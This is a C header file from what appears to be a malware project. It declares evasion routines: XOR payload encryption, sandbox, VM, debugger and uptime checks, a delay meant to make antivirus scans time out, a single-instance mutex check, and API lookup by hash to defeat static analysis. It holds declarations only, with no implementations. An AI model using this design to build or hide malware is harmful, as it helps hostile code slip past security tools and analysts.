#ifndef EVASION_H
#define EVASION_H

#include <stddef.h>
#include <windows.h> 
#include <stdbool.h>

// --- ENCRYPTION

// cypher/decypher data with XOR
void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len);

// --- ANTI-SANDBOX

// check machine resources (RAM and cores)
bool check_resources();

// execute complex calculations to make the AV timeout.
void smart_delay();

// check if malware is attached to a debugger
bool check_debugger();

// check machine startup time
bool check_uptime();

// check if executed in VM
bool check_vm();

// --- ANTI-CRASH

typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
typedef DWORD (WINAPI *pGetLastError)(void);

// check if malware is already running
bool check_mutex();

// --- ANTI-STATIC ANALYSIS (Dynamic API resolution with hashing)

// hashing function
DWORD djb2_hash(const char* str);

// takes DDL handle and desired API hash,
// finds function address and return a generic pointer (FARPROC)
FARPROC get_api_by_hash(HMODULE hModule, DWORD api_hash);

#endif